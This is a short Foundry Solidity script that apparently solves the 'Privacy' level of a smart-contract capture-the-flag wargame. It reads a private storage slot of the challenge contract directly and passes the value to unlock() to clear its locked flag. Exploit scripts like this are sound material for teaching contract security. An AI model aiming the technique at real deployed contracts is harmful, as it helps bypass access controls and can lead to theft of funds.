// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/12_privacy.sol";

contract AttackerPrivacyScript is Script {
    Privacy privacy = Privacy(vm.envAddress("INSTANCE"));

    function run() external {
        vm.startBroadcast();

        bytes32 key = vm.load(address(privacy), bytes32(uint256(5)));

        console.log("Current locked :", privacy.locked());
        privacy.unlock(bytes16(key));
        console.log("new locked :", privacy.locked());

        vm.stopBroadcast();
    }
}
